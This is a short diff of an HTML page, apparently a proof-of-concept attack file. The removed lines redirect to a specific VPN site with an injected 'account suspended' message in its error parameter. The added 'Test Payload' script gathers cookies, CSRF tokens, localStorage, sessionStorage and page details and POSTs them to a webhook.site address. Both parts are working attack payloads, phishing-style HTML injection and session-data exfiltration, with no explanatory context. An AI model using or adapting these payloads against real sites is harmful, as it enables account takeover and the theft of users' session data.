@@ -1,17 +1,25 @@
 <!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="UTF-8">
-    <title>Redirecting...</title>
-    <script>
-      const payload = encodeURIComponent(
-        '\"><div style="color:red;font-weight:bold">Your account has been suspended due to suspicious activity.</div>'
-      );
-      const target = "https://vpn.mobilevikings.be/?error=" + payload;
-      location.href = target;
-    </script>
-  </head>
   <body>
-    <p>Redirecting...</p>
+    <h3>Test Payload</h3>
+    <script>
+    (async () => {
+      const payload = {
+        location: location.href,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        cookies: document.cookie,
+        csrfToken: document.querySelector('[name=csrf]')?.value || document.querySelector('[name=csrf_token]')?.value || 'none',
+        localStorage: JSON.stringify(localStorage),
+        sessionStorage: JSON.stringify(sessionStorage),
+      };
+
+      await fetch('https://webhook.site/d482c1c7-5479-4ff1-8bb0-5ea90fae49e6', {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify(payload)
+      });
+    })();
+    </script>
   </body>
 </html>
